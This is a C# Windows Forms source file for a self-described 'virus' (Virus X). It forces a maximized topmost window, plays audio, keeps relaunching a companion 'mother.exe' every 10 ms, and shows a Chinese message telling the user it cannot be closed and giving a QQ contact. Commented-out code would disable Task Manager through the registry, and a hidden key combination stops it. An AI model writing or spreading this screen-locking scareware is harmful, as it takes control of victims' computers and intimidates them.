using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace 病毒
{
    public partial class Form1 : Form
    {
        string bingdu;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            bingdu = Application.StartupPath;

            timer1.Interval = 10;
            timer1.Start();
            this.WindowState = FormWindowState.Maximized;
            axWindowsMediaPlayer1.URL = bingdu+"\\1.mp3";
            axWindowsMediaPlayer1.Ctlcontrols.play();//播放文件
            if (!IsProgresStated("mother"))
            {
                Process m_program = null;
                m_program = new Process();
                m_program.StartInfo.FileName = bingdu + "\\mother.exe";
                m_program.Start();
            }
            richTextBox1.BackColor = Color.Black;
            richTextBox1.Text =
            "\n\n\n\n\n                 亲爱的用户您好\n  \n\n                 我是病毒X,很荣幸能让您看到我。在此首先祝您清明节快乐！！！\n \n\n                请不要费力去关掉我，因为我的主人已经尝试了很多方法\n\n\n                 您如果想关掉我，请咨询: \n\n\n                                                  QQ:2491299928";

            ////屏蔽资源管理器，但是不行，因为必须亲手同意才行
            //Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.CreateSubKey
            //    (@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            //rk.SetValue("DisableTaskMgr",1,Microsoft.Win32.RegistryValueKind.DWord);
        }

        //定时器
        private void timer1_Tick(object sender, EventArgs e)
        {
            this.TopMost = true;
            if (!IsProgresStated("mother"))
            {
                Process m_program = null;
                m_program = new Process();
                m_program.StartInfo.FileName = bingdu + "\\mother.exe";
                m_program.Start();
            }
        }

        //程序状态判断
        private bool IsProgresStated(string progressName)
        {
            Process[] temp = Process.GetProcessesByName(progressName);
            if (temp.Length > 0) return true;//打开返回true，关闭返回false
            else
                return false;
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            // Ctrl + Alt + Shift + H   
            if ((Control.ModifierKeys & Keys.Control) != 0 &&
                 (Control.ModifierKeys & Keys.Alt) != 0 &&
                 (Control.ModifierKeys & Keys.Shift) != 0 &&
                 e.KeyCode == Keys.Z)
            {
                this.TopMost = false;
                timer1.Stop();
                //Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.CreateSubKey
                //    (@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                //rk.SetValue("DisableTaskMgr", 0, Microsoft.Win32.RegistryValueKind.DWord);
            }  
        }

        
  
    }
}
